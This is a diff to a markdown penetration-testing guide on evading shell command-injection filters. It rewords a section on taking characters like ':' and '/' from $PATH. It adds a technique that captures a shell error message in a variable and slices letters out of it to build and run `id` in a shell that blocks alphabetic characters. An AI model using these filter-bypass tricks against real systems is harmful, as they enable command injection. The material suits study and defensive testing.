@@ -77,9 +77,9 @@ we can add spaces from within the parentheses to make the shell interpret the co
 this will be evaluated as `echo $((ls -la ) ) #))`, which will be interpreted as `echo $((ls -la) )` and will show us the output of the command `ls -la`.
 
 
-### Getting Characters From Environment Variables
+### Getting Characters From Variables
 
-We can bypass some filters by using environment variables to get the characters we need. For example, if we want to get the character `:`, or `/`, we can use the environment variable `PATH` which contains a colon `:` and `/` in its value.
+We can bypass some filters by using variables to get the characters we need. For example, if we want to get the character `:`, or `/`, we can use the `PATH` environment variable `PATH` which contains a colon `:` and `/` in its value.
 
 ```bash
 echo $PATH
@@ -96,6 +96,33 @@ This will return the character `:`. We can use the same technique to get the cha
 
 ```bash
 ${PATH:0:1}
+```
+
+We can force more characters available to our use by creating variables from errors. For example, if we have a shell that restricts every alphabetic character, and we see an error like:
+
+```bash
+$ /_
+zsh: no such file or directory: /_
+```
+
+We sent the `/_` input and got that error, we can see that we have `d` and `i` on that error, if this was a variable we could get it to send the command `id`, so, we can save this error in a variable and use it to get the characters we need. Since it comes from `stderr` we can redirect the standard error for the error to our output with `2>&1`
+
+```bash
+_1=$(/_ 2>&1)
+$ $_1
+zsh: no such file or directory: zsh: no such file or directory: /_
+```
+
+As we can see, it tried running our variable which expanded to the error, so now we can get the characters we want to run the command `id`:
+
+```bash
+# Get char i
+${_1:22:1}
+zsh: command not found: i
+# Get char d and running id
+
+$ ${_1:22:1}${_1:21:1}
+uid=1000(user) gid=1000(user) groups=1000(user),965(docker),998(wheel)
 ```
 
 ### Bash without letters
